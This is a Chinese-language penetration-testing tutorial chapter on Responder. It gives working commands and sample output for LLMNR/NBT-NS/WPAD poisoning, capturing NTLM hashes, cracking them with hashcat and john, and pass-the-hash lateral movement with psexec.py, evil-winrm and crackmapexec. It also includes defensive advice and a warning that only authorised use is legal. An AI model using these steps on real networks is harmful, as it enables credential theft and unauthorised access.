# 第二十一章：Responder - LLMNR/NBT-NS欺骗工具

## 21.1 Responder 简介

### 什么是 Responder？

想象一下，你在一个大型办公室里，想要找一个叫"张三"的同事。你不知道他的位置，于是你站在走廊里大喊："请问张三在哪里？"

正常情况下，只有真正的张三会回应你。但如果有一个调皮的人冒充张三回应了你，你可能会把重要信息告诉这个冒充者。

**Responder**就是这样一个"冒充者"——它会在Windows网络中监听各种名称解析请求，当有用户询问某个不存在的主机名时，Responder就会冒充这个主机名，诱骗用户发送认证信息。

简单来说，Responder是一个**LLMNR/NBT-NS欺骗工具**，它可以：
- 监听网络上的名称解析请求
- 冒充不存在的主机
- 捕获用户的NTLM认证哈希
- 这些哈希可以用于后续的密码破解或Pass-the-Hash攻击

### Responder 能做什么？

| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| LLMNR欺骗 | 欺骗LLMNR名称解析 | 冒充你要找的人 |
| NBT-NS欺骗 | 欺骗NetBIOS名称服务 | 冒充旧系统中的主机 |
| MDNS欺骗 | 欺骗多播DNS | 冒充局域网中的设备 |
| WPAD代理 | 伪造代理配置 | 让所有流量经过你 |
| SMB中继 | 中继SMB认证 | 用别人的身份访问资源 |

### 为什么Responder如此强大？

Responder之所以强大，是因为它利用了Windows系统的一个"信任"机制：

1. Windows默认信任网络中的名称解析
2. 当用户访问`\\fileserver\share`时，如果fileserver不存在
3. Windows会广播询问"谁是fileserver？"
4. 如果没有人回应，用户会收到错误
5. 但如果Responder回应了，Windows会相信Responder就是fileserver
6. 然后用户会向Responder发送NTLM认证信息

这就像你在办公室里大喊"张三在哪里？"，一个陌生人回应"我是张三"，你就相信了他。

---

## 21.2 安装教程

### Kali Linux（预装）

Kali Linux预装了Responder，直接使用即可：

```bash
responder --help
```

输出示例：
```
Responder 3.1.4.0 - by Laurent Gaffie (laurent.gaffie@gmail.com)
...
Options:
  -I, --interface=INTERFACE  Network interface to use
  -i, --ip=IP                Local IP to use (useful for multi-homed systems)
  -e, --external-ip=IP       Poison all requests with this IP (usually used with -I)
  -b, --basic                Return a Basic HTTP authentication
...
```

### Ubuntu/Debian 安装

```bash
sudo apt update
sudo apt install responder
```

验证安装：
```bash
responder --version
```

### 源码安装（最新版）

如果你想要使用最新版本，可以从GitHub克隆：

```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
```

运行Responder：
```bash
python3 Responder.py -h
```

---

## 21.3 LLMNR/NBT-NS原理详解

### 什么是LLMNR？

**LLMNR（Link-Local Multicast Name Resolution）**是Windows Vista及以后版本使用的一种名称解析协议。

**通俗理解：**
就像你在办公室里找不到人时大喊一声，LLMNR就是Windows在局域网中"大喊"的方式。

**工作原理：**

假设用户想要访问`\\fileserver\share`，但fileserver不存在：

1. Windows先尝试DNS解析fileserver，失败
2. Windows发送LLMNR查询："谁是fileserver？"（组播到224.0.0.252:5355）
3. 如果网络中有fileserver，它会回应："我是fileserver，我的IP是192.168.1.100"
4. Windows连接到这个IP
5. 如果没有人回应，用户收到"找不到网络路径"错误

**Responder如何欺骗：**

当Responder收到LLMNR查询时，它会立即回应："我是fileserver，我的IP是攻击者的IP"。Windows相信了这个回应，然后向攻击者的IP发送认证请求。

### 什么是NBT-NS？

**NBT-NS（NetBIOS Name Service）**是Windows老版本（Windows XP及更早）使用的名称解析协议。

**通俗理解：**
就像LLMNR的老版本，工作方式类似，但使用不同的端口和协议。

**工作原理：**

1. Windows发送NBT-NS查询："谁是fileserver？"（广播到192.168.1.255:137）
2. 目标主机回应自己的IP
3. Windows连接到该IP

**Responder同样可以欺骗NBT-NS查询。**

### 什么是MDNS？

**MDNS（Multicast DNS）**是Apple和Linux系统使用的名称解析协议。

**通俗理解：**
就像苹果电脑和Linux电脑在局域网中使用的"大喊"方式。

### LLMNR vs NBT-NS vs MDNS

| 协议 | 端口 | 使用系统 | 特点 |
|------|------|----------|------|
| LLMNR | 5355 | Windows Vista+ | 现代、高效 |
| NBT-NS | 137 | Windows XP及更早 | 老旧、兼容 |
| MDNS | 5353 | macOS、Linux | Apple标准 |

### 攻击流程详解

```
用户在Windows上访问 \\nonexistent\share
        ↓
Windows尝试DNS解析，失败
        ↓
Windows发送LLMNR/NBT-NS查询："谁是nonexistent？"
        ↓
Responder收到查询，立即回应："我是nonexistent，IP是192.168.1.50"
        ↓
Windows相信Responder，向192.168.1.50发起连接
        ↓
Responder要求NTLM认证
        ↓
Windows发送NTLM哈希给Responder
        ↓
Responder捕获哈希，保存到日志文件
```

---

## 21.4 基础使用详解

### 启动Responder

**最简单的启动方式：**
```bash
sudo responder -I eth0
```

参数说明：
- `-I eth0`：指定监听的网络接口为eth0

**输出示例：**
```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
  ...
  [+] Listening for events...
```

**常见输出解读：**

| 输出类型 | 说明 |
|----------|------|
| `[*] LLMNR Query` | 收到LLMNR查询 |
| `[*] NBT-NS Query` | 收到NBT-NS查询 |
| `[+] Listening for events...` | 正在监听 |

### 常用参数详解

| 参数 | 说明 | 示例 |
|------|------|------|
| -I | 指定网络接口 | `-I eth0` |
| -i | 指定本地IP | `-i 192.168.1.50` |
| -e | 指定外部IP | `-e 10.0.0.1` |
| -w | 启用WPAD代理 | `-w` |
| -F | 强制认证 | `-F` |
| -P | 强制NTLMv1 | `-P` |
| -v | 详细模式 | `-v` |
| -d | 分析模式（不欺骗） | `-d` |
| -l | 启用日志 | `-l` |
| --lm | 强制LM哈希 | `--lm` |
| --disable-ess | 禁用ESS | `--disable-ess` |

### 使用详细模式

```bash
sudo responder -I eth0 -v
```

详细模式会显示更多信息，包括每个查询的详细内容。

### 使用分析模式

```bash
sudo responder -I eth0 -d
```

分析模式只监听，不进行欺骗，用于了解网络中有哪些名称解析请求。

---

## 21.5 WPAD代理欺骗详解

### 什么是WPAD？

**WPAD（Web Proxy Auto-Discovery）**是一种自动配置代理服务器的协议。

**通俗理解：**
就像办公室里的公告板，写着"所有人都请使用这个代理服务器"。

**工作原理：**

1. Windows启动时会查询WPAD配置
2. 它会搜索`wpad`主机或`wpad.example.com`
3. 如果找到，它会下载代理配置文件
4. 然后所有HTTP/HTTPS流量都会通过这个代理

**Responder如何利用WPAD：**

Responder可以冒充WPAD服务器，让所有Windows主机使用攻击者的代理。这样，攻击者可以拦截所有HTTP/HTTPS流量！

### 启用WPAD欺骗

```bash
sudo responder -I eth0 -w
```

参数`-w`启用WPAD代理功能。

### WPAD欺骗的威力

一旦启用WPAD欺骗：
- 所有Windows主机的HTTP/HTTPS流量都会经过攻击者
- 可以捕获明文密码（HTTP）
- 可以尝试SSL剥离攻击（HTTPS）
- 可以修改网页内容

---

## 21.6 哈希捕获与分析

### 哈希保存位置

Responder将捕获的哈希保存在`/usr/share/responder/logs/`目录（Kali）或当前目录的`logs/`目录（源码运行）。

**日志文件结构：**

```
logs/
├── NTLMv1-User.txt       # NTLMv1哈希
├── NTLMv2-User.txt       # NTLMv2哈希
├── Responder-Session.log # 会话日志
└── wpad.dat              # WPAD配置文件
```

### NTLMv1哈希格式

```
USER::DOMAIN:LM_HASH:NTLM_HASH:::
```

示例：
```
admin::CORP:abc123:d41d8cd98f00b204e9800998ecf8427e:::
```

### NTLMv2哈希格式

```
USER::DOMAIN:CHALLENGE:RESPONSE:::
```

示例：
```
admin::CORP:1122334455667788:99aabbccddeeff001122334455667788:::
```

### 哈希类型对比

| 类型 | 安全性 | 破解难度 | 推荐破解工具 |
|------|--------|----------|--------------|
| NTLMv1 | 低 | 简单 | Hashcat、John |
| NTLMv2 | 中 | 中等 | Hashcat |

### 查看捕获的哈希

```bash
cat /usr/share/responder/logs/NTLMv2-User.txt
```

---

## 21.7 哈希破解详解

### 使用Hashcat破解NTLMv1

```bash
hashcat -m 5500 /usr/share/responder/logs/NTLMv1-User.txt /usr/share/wordlists/rockyou.txt
```

参数说明：
- `-m 5500`：NTLMv1哈希类型
- `/usr/share/wordlists/rockyou.txt`：密码字典

### 使用Hashcat破解NTLMv2

```bash
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-User.txt /usr/share/wordlists/rockyou.txt
```

参数说明：
- `-m 5600`：NTLMv2哈希类型

### 使用John破解

```bash
john /usr/share/responder/logs/NTLMv2-User.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 破解结果示例

```
admin             (user1)
password123       (user2)
```

### 注意事项

1. NTLMv2比NTLMv1更难破解
2. 强密码很难破解
3. 如果字典中没有正确密码，破解会失败

---

## 21.8 Pass-the-Hash攻击详解

### 什么是Pass-the-Hash？

**Pass-the-Hash（传递哈希）**是一种攻击方法，使用哈希值代替密码进行认证。

**通俗理解：**
就像你有一把钥匙的复印件，虽然不是真正的钥匙，但也能打开锁。

**为什么Pass-the-Hash有效？**

Windows在认证时，实际上是比较哈希值，而不是密码本身。所以如果你有了哈希值，就可以直接用来认证，不需要知道原始密码！

### 使用Impacket进行Pass-the-Hash

```bash
psexec.py -hashes :d41d8cd98f00b204e9800998ecf8427e admin@target.example.com
```

参数说明：
- `-hashes :NTLM_HASH`：指定NTLM哈希（冒号前为空表示LM哈希为空）

### 使用Evil-WinRM进行Pass-the-Hash

```bash
evil-winrm -i target.example.com -u admin -H d41d8cd98f00b204e9800998ecf8427e
```

### 使用CrackMapExec进行Pass-the-Hash

```bash
cme smb target.example.com -u admin -H d41d8cd98f00b204e9800998ecf8427e
```

---

## 21.9 实战案例：内网哈希捕获

### 场景说明

你已经进入了一个内网环境（比如通过钓鱼或漏洞利用），现在想要捕获更多用户的凭证。

### 环境准备

**确认网络接口：**
```bash
ip a
```

找到你当前使用的网络接口（通常是eth0或wlan0）。

### 步骤1：启动Responder

```bash
sudo responder -I eth0 -wFv
```

参数说明：
- `-I eth0`：监听eth0接口
- `-w`：启用WPAD代理
- `-F`：强制认证
- `-v`：详细模式

**输出示例：**
```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
  ...
  [+] Listening for events...
```

### 步骤2：等待捕获

Responder启动后，开始监听网络上的名称解析请求。

**常见触发场景：**
- 用户访问不存在的共享文件夹
- 用户访问错误的主机名
- 用户使用映射网络驱动器
- Windows自动查询WPAD

### 步骤3：观察捕获

当有用户访问不存在的主机时，Responder会显示：

```
[*] LLMNR Query for 'fileserver' from 192.168.1.101
[+] Responding to LLMNR query for 'fileserver'
[*] SMB Session from 192.168.1.101 (SMBv2)
[*] NTLMv2 hash captured for user 'admin' from 192.168.1.101
```

### 步骤4：查看哈希

```bash
cat /usr/share/responder/logs/NTLMv2-User.txt
```

输出示例：
```
admin::CORP:1122334455667788:99aabbccddeeff001122334455667788:::
```

### 步骤5：破解哈希

```bash
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-User.txt /usr/share/wordlists/rockyou.txt
```

如果密码在字典中，会显示：
```
admin             (admin)
```

### 步骤6：Pass-the-Hash

使用破解的密码或直接使用哈希进行横向移动：

```bash
evil-winrm -i 192.168.1.102 -u admin -H 99aabbccddeeff001122334455667788
```

---

## 21.10 实战案例：WPAD代理欺骗

### 场景说明

你想要拦截内网中所有Windows主机的HTTP/HTTPS流量。

### 步骤1：启动Responder（带WPAD）

```bash
sudo responder -I eth0 -w
```

参数`-w`启用WPAD代理功能。

### 步骤2：等待主机连接

Windows主机启动时会自动查询WPAD配置。如果Responder正在运行，它会响应WPAD查询，让主机使用攻击者的代理。

### 步骤3：查看代理日志

```bash
cat /usr/share/responder/logs/Responder-Session.log
```

日志会显示所有通过代理的HTTP请求。

### 步骤4：捕获密码

如果有用户通过HTTP登录网站，密码会以明文形式出现在日志中：

```
GET /login.php?username=admin&password=password123 HTTP/1.1
Host: target.example.com
```

### 步骤5：SSL剥离（可选）

对于HTTPS网站，你可以尝试SSL剥离攻击，但这需要额外的配置。

---

## 21.11 防御方法详解

### 方法1：禁用LLMNR

**Windows 10/11：**

1. 打开组策略编辑器：`gpedit.msc`
2. 导航到：计算机配置 → 管理模板 → 网络 → DNS客户端
3. 双击"关闭多播名称解析"
4. 选择"已启用"
5. 点击"确定"

### 方法2：禁用NBT-NS

1. 打开网络连接属性
2. 双击"Internet协议版本4 (TCP/IPv4)"
3. 点击"高级"
4. 切换到"WINS"选项卡
5. 选择"禁用TCP/IP上的NetBIOS"
6. 点击"确定"

### 方法3：使用DNS服务器

确保所有主机使用正确的DNS服务器，不要依赖广播名称解析。

### 方法4：启用SMB签名

SMB签名可以防止SMB中继攻击。

### 方法5：监控网络

使用Wireshark监控网络中的异常LLMNR/NBT-NS查询和响应。

---

## 21.12 常见问题与解决方案

### 问题1：Responder没有捕获到哈希

**可能原因：**
- 网络接口选择错误
- 没有用户访问不存在的主机
- Windows防火墙阻止了流量

**解决方案：**
- 使用`ip a`确认网络接口
- 使用分析模式(`-d`)查看是否有查询
- 确保目标主机没有禁用LLMNR/NBT-NS

### 问题2：捕获到哈希但无法破解

**可能原因：**
- 密码不在字典中
- 密码是强密码
- 哈希格式错误

**解决方案：**
- 使用更大的字典
- 尝试使用掩码攻击
- 确认哈希格式正确

### 问题3：WPAD欺骗不起作用

**可能原因：**
- 目标主机已经配置了代理
- 目标主机禁用了WPAD
- DNS服务器返回了正确的WPAD地址

**解决方案：**
- 确认目标主机没有手动配置代理
- 使用`-v`查看WPAD查询

### 问题4：Responder权限不足

**可能原因：**
- 没有使用`sudo`
- 没有权限访问网络接口

**解决方案：**
- 使用`sudo`运行Responder

---

## 21.13 注意事项与最佳实践

### 合法使用

Responder是一个强大的工具，但必须在合法授权的情况下使用！未经授权捕获他人的认证信息是违法行为。

### 网络影响

Responder会影响网络中的名称解析，可能导致正常的网络操作失败。在测试环境中使用时要小心。

### 日志清理

测试完成后，记得清理日志文件，避免敏感信息泄露。

### 组合使用

Responder通常与其他工具配合使用：
- Hashcat：破解哈希
- Impacket：Pass-the-Hash攻击
- Evil-WinRM：远程管理
- CrackMapExec：批量测试

### 持续监控

在生产环境中，建议持续监控LLMNR/NBT-NS活动，及时发现异常。

---

## 总结

本章详细介绍了Responder的使用：

1. **原理详解**：LLMNR/NBT-NS欺骗原理，用"办公室找人"的比喻解释清楚
2. **安装配置**：Kali预装、Ubuntu安装、源码安装
3. **基础使用**：启动监听、常用参数详解
4. **WPAD欺骗**：启用WPAD代理，拦截HTTP/HTTPS流量
5. **哈希捕获**：NTLMv1/NTLMv2哈希格式和保存位置
6. **哈希破解**：Hashcat和John破解方法
7. **Pass-the-Hash**：使用哈希进行横向移动
8. **实战案例**：内网哈希捕获、WPAD代理欺骗
9. **防御方法**：禁用LLMNR/NBT-NS、启用SMB签名等
10. **常见问题**：解决各种使用问题

Responder是内网渗透中不可或缺的工具，掌握它能够帮助你快速获取内网凭证。

下一章我们将学习Mimikatz——Windows凭证提取工具！